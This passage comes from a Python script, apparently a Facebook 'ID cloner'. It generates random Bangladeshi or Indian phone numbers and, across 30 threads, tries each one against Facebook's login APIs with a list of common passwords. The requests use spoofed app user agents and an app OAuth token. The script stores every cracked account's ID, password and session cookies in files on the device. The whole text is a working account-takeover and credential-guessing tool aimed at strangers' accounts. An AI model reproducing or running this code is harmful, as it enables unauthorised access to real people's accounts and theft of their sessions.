                                                open('/sdcard/XTM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#———————————————RANDOM kalara———————————————#
bXTM="\033[1;30m" 
M="\033[1;31m"       
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
my_color = [AA]
GG = [AA]
warnXa = random.choice(my_color)
warna = random.choice(GG)
oks=[]
cps=[]
loop=0
xxyt=[]
#———————————————RANDOM———————————————#
#                                                RANDOM M1 UP
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def morshed3():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        return ua
#———————————————RANDOM———————————————#
#                                                RANDOM M2 UP


def morshed90():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
        return ua


#———————————————RANDOM———————————————#
def RANDOMBD():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear");print(logo)
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}017 {X}| {G}019 {X}| {G}016 {X}| {G}018 {X}| {G}011')
    linex()
    code = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER SIM CODE : ')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}2000 {X}| {G}3000 {X}| {G}4000{X} | {G}5000')
    linex()
    limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKI LOGIN{XX}]')
    linex()
    mthdx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SIM CODE  {R}: {G}{code}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL UID {R}: {G}{tl} \033[1;37m')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE {N}>> {G}M{mthdx}')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','morshed','gaming','tamanna','jannat','laboni','708090','121234','77889900','999888','113355','112255','102030','405060','112200','506070','113355']
            ids = code+love
            if mthdx in ['1','1']:
            	morshed.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
            	morshed.submit(FIREX,ids,pwx,tl)
            if mthdx in ['3','3']:
            	morshed.submit(M3Z,ids,pwx,tl)

def RANDOMIN():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear");print(logo)
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}+91730 {X}| {G}+91720 {X}| {G}+91789 ')
    linex()
    code = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER SIM CODE : ')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}2000 {X}| {G}3000 {X}| {G}4000{X} | {G}5000')
    linex()
    limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKI LOGIN{XX}]')
    linex()
    mthdx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        #print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SIM CODE  {R}: {G}{code}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL UID {R}: {G}{tl} \033[1;37m {N}>> {G}M{mthdx}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200']
            ids = code+love
            if mthdx in ['1','1']:
            	morshed.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
            	morshed.submit(FIREX,ids,pwx,tl)
            if mthdx in ['3','3']:
            	morshed.submit(M3Z,ids,pwx,tl)
            

#-------------------------RANDOM M1----------------------------#
def FIRE(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mXTM-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bXTM}[{G}XTM-OK{bXTM}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bXTM}[{G}•{bXTM}]{G} '+kuki+'')
                linex()
                open('/sdcard/XTM-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#——————————RANDOM M2——————————#
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mXTM-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bXTM}[{G}XTM-OK{bXTM}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bXTM}[{G}•{bXTM}]{G} '+kuki+'')
                linex()
                open('/sdcard/XTM-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass



def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mXTM-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bXTM}[{G}XTM-OK{bXTM}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bXTM}[{G}•{bXTM}]{G} '+kuki+'')
                linex()
                open('/sdcard/XTM-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#———————————————#
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()